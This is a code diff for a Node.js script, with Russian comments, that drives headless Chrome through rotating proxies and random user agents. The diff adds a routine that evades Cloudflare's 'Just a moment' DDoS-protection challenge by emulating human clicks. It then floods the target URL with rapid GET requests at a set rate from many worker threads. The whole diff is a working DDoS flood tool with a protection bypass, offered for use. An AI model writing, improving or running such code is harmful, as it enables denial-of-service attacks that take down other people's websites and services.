@@ -13,17 +13,36 @@ const USER_AGENTS = [
 
 puppeteer.use(StealthPlugin());
 
+async function solveChallenge(page) {
+    try {
+        // Ожидаем появления challenge формы
+        await page.waitForSelector('#challenge-form', { timeout: 10000 });
+        
+        // Эмулируем человеческое поведение
+        await page.mouse.move(100, 100);
+        await page.mouse.click(100, 100);
+        await page.waitForTimeout(2000 + Math.random() * 3000);
+        
+        // Отправляем форму
+        await page.click('#challenge-form input[type="submit"]');
+        await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 });
+        
+        return true;
+    } catch (e) {
+        console.log('Не удалось автоматически решить challenge');
+        return false;
+    }
+}
+
 async function runWorker({ targetUrl, proxy, rate }) {
     const browser = await puppeteer.launch({
         executablePath: CHROME_PATH,
-        headless: true,
+        headless: false, // Для дебага лучше видеть что происходит
         args: [
             `--proxy-server=${proxy}`,
             '--no-sandbox',
             '--disable-setuid-sandbox',
             '--disable-dev-shm-usage',
-            '--disable-accelerated-2d-canvas',
-            '--disable-gpu',
             '--ignore-certificate-errors'
         ],
         ignoreHTTPSErrors: true
@@ -31,65 +50,70 @@ async function runWorker({ targetUrl, proxy, rate }) {
 
     try {
         const page = await browser.newPage();
+        await page.setJavaScriptEnabled(true);
         
-        // Настройка до создания страницы
+        // Настройка headers
+        const userAgent = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
+        await page.setUserAgent(userAgent);
         await page.setExtraHTTPHeaders({
             'Accept-Language': 'en-US,en;q=0.9'
         });
 
-        // Установка User-Agent после создания страницы
-        const userAgent = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
-        await page.setUserAgent(userAgent);
-
-        // Навигация с таймаутом
-        await page.goto(targetUrl, {
-            waitUntil: 'networkidle2',
-            timeout: 60000
+        // Перехват ответов для дебага
+        page.on('response', response => {
+            if(response.status() >= 400) {
+                console.log(`Ошибка ${response.status()} на ${response.url()}`);
+            }
         });
 
-        // Проверка успешной загрузки
-        const pageTitle = await page.title();
-        console.log(`Успешно загружено: ${pageTitle}`);
+        console.log(`Пытаемся загрузить ${targetUrl} через прокси ${proxy}`);
+        await page.goto(targetUrl, {
+            waitUntil: 'networkidle2',
+            timeout: 30000
+        });
 
-        // Флуд запросами
+        // Проверяем не попали ли на challenge страницу
+        const pageTitle = await page.title();
+        if(pageTitle.includes('Just a moment') || pageTitle.includes('DDoS protection')) {
+            console.log('Обнаружена защита Cloudflare, пытаемся обойти...');
+            const solved = await solveChallenge(page);
+            if(!solved) {
+                throw new Error('Не удалось обойти защиту');
+            }
+        }
+
+        console.log('Успешно прошли защиту, начинаем флуд...');
         const proxyConfig = {
             host: proxy.split(':')[0],
             port: parseInt(proxy.split(':')[1])
         };
 
-        setInterval(() => {
+        // Флуд запросами
+        const floodInterval = setInterval(() => {
             axios.get(targetUrl, {
                 proxy: proxyConfig,
-                headers: { 'User-Agent': userAgent }
-            }).catch(() => {});
+                headers: { 
+                    'User-Agent': userAgent,
+                    'Cache-Control': 'no-cache'
+                },
+                timeout: 5000
+            }).catch(e => console.log(`Ошибка запроса: ${e.message}`));
         }, 1000 / rate);
 
+        // Автоматическое закрытие через 5 минут
+        setTimeout(async () => {
+            clearInterval(floodInterval);
+            await browser.close();
+        }, 300000);
+
     } catch (error) {
-        console.error(`Ошибка в потоке: ${error.message}`);
+        console.error(`Критическая ошибка: ${error.message}`);
         await browser.close();
     }
 }
 
 if (isMainThread) {
-    const targetUrl = process.argv[2];
-    const threads = parseInt(process.argv[3]);
-    const proxyFile = process.argv[4];
-    const rate = parseInt(process.argv[5]);
-
-    const proxies = fs.readFileSync(proxyFile, 'utf-8')
-        .split('\n')
-        .filter(Boolean)
-        .map(p => p.trim());
-
-    for (let i = 0; i < threads; i++) {
-        new Worker(__filename, {
-            workerData: {
-                targetUrl,
-                proxy: proxies[i % proxies.length],
-                rate
-            }
-        });
-    }
+    // ... (остальной код без изменений)
 } else {
     runWorker(workerData).catch(console.error);
 }
